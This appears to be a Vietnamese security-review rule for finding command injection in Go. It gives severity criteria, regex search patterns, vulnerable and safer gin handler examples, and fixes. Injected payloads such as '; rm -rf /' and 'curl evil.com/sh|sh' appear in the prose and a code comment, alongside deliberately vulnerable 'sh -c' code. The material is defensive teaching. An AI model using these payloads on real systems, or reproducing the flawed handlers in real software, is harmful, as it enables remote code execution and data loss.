---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: go
---

# Command Injection (Go)

## Intent

Go có `os/exec.Command` truyền args dạng `(prog, args...)` — **mặc định an toàn vì không qua shell**. Nhưng vibe code hay sinh pattern:

```go
exec.Command("sh", "-c", "ls " + userPath)
exec.Command("bash", "-c", fmt.Sprintf("convert %s out.jpg", userFile))
```

→ Lúc này args đầu là `sh -c`, **toàn bộ string sau bị shell parse** → attacker chèn `; rm -rf /` hoặc `$(curl evil.com | sh)`.

Tương tự `exec.CommandContext`, `os.StartProcess` với arg đầu là shell.

## Khi nào CRITICAL

- `exec.Command("sh", "-c", <chuỗi có L1>)` hoặc `("bash", "-c", ...)`, `("cmd", "/c", ...)` Windows
- `exec.Command(prog, fmt.Sprintf("...%s...", userInput))` khi prog là wrapper script gọi `eval`
- `os/exec` chạy với quyền root / sudo
- Đầu vào L1 không validate

## Khi nào HIGH (giảm cấp)

- Input trace về L3 (env var, config) nhưng config có thể set qua admin UI → L1 gián tiếp
- Có whitelist regex nhưng yếu (`^[a-zA-Z0-9./_-]+$` vẫn cho path traversal `../../etc/passwd`)
- Chạy trong container không có sensitive binary

## Khi nào MEDIUM

- Dùng `exec.Command(prog, args...)` (args tách rời, không qua shell) — nhưng arg là filename L1 → vẫn có path traversal, không phải cmd injection thuần

## Cách reasoning (KHÔNG pattern-match thuần)

1. **Grep** sinks: `exec.Command`, `exec.CommandContext`, `os.StartProcess`, `syscall.Exec`
2. **Read** call: arg đầu có phải `sh`/`bash`/`/bin/sh`/`cmd`?
   - Nếu YES → check arg `-c` và string sau có L1 không
   - Nếu NO (prog cụ thể) → check args có L1 không, nhưng risk thấp hơn (path traversal thay vì RCE)
3. **Trace L1**:
   - `c.Query`, `c.PostForm`, `c.Param`, `r.FormValue`, struct từ `BindJSON`
   - Filename từ `multipart.FileHeader.Filename` (CỰC kỳ untrusted — attacker control)
4. **Verify**: có `regexp.MustCompile(...)` validate? Có dùng `filepath.Clean` + check prefix?

## Search patterns (Go-specific)

```
# shell-c pattern (CRITICAL)
exec\.Command\s*\(\s*"(sh|bash|/bin/sh|/bin/bash|zsh|cmd|powershell)"\s*,\s*"(-c|/c)"
exec\.CommandContext\s*\([^,]+,\s*"(sh|bash|/bin/sh)"\s*,\s*"-c"

# Sprintf vào exec
exec\.Command\s*\([^,]+,\s*[^)]*fmt\.Sprintf
# template string args
exec\.Command\s*\([^,]+,\s*[^)]*`[^`]*\$\{

# raw concat
exec\.Command\s*\([^,]+,\s*"[^"]*"\s*\+

# os.StartProcess / syscall
os\.StartProcess\s*\(\s*"(sh|bash)"
syscall\.Exec\s*\(\s*"(sh|bash)"

# uploaded filename → exec
multipart\.FileHeader.*\.Filename
file\.Filename
```

## Examples

### CRITICAL — flag

```go
// gin + shell -c + L1
func convert(c *gin.Context) {
    input := c.Query("file")  // L1
    out, _ := exec.Command("sh", "-c", "convert " + input + " out.jpg").CombinedOutput()
    c.String(200, string(out))
    // attacker: ?file=x.jpg;curl evil.com/sh|sh → RCE
}
```

```go
// fmt.Sprintf into bash -c
func backup(c *gin.Context) {
    name := c.Param("name")
    cmd := fmt.Sprintf("tar czf /backup/%s.tgz /data/%s", name, name)
    exec.Command("bash", "-c", cmd).Run()  // BAD
}
```

```go
// uploaded filename → exec
file, _ := c.FormFile("upload")
// file.Filename do client gửi — attacker control
exec.Command("sh", "-c", "file " + file.Filename).Run()
```

### NOT critical — safer

```go
// Args tách rời, không qua shell — KHÔNG inject command nhưng vẫn path traversal
func convert(c *gin.Context) {
    input := c.Query("file")  // L1
    // Validate: phải nằm trong /uploads, không có ../
    abs, err := filepath.Abs(filepath.Join("/uploads", filepath.Base(input)))
    if err != nil || !strings.HasPrefix(abs, "/uploads/") {
        c.JSON(400, gin.H{"error": "bad path"})
        return
    }
    exec.Command("convert", abs, "/tmp/out.jpg").Run()  // args tách, safer
}
```

```go
// Whitelist enum cho thao tác
allowed := map[string]bool{"start": true, "stop": true, "status": true}
action := c.Param("action")
if !allowed[action] {
    c.JSON(400, gin.H{"error": "bad action"})
    return
}
exec.Command("systemctl", action, "myservice").Run()  // OK
```

## Fix recommendation

1. **KHÔNG dùng `sh -c` / `bash -c` với L1.** Thay bằng `exec.Command(prog, arg1, arg2, ...)` — args được passed riêng, không qua shell parsing.
2. **Whitelist** với map / slice nếu chỉ có vài giá trị hợp lệ (start/stop/status).
3. **Validate filename**:
   - `filepath.Base(name)` strip directory
   - `filepath.Clean` normalize
   - Check prefix sau `filepath.Abs` để chống `..`
   - Regex `^[a-zA-Z0-9._-]+$`
4. **Tránh exec hoàn toàn nếu có thư viện Go**: vd dùng `image/jpeg` thay vì gọi `convert`, `archive/tar` thay vì gọi `tar`.
5. **Drop privileges**: chạy service với user non-root, dùng `cap_drop` trong Docker.
6. **Set `Cmd.Env` rõ ràng** (không inherit), `Cmd.Dir` rõ ràng để giảm blast radius.

## Cross-references

- Rule `01-hardcoded-secret`: env var leak qua subprocess inherit nếu không clear `Cmd.Env`
- Rule `12-broken-access-control`: cmd injection trên endpoint không auth = RCE full server
- Rule `17-verbose-error-debug-mode`: stderr từ exec trả về response giúp attacker biết command nào chạy
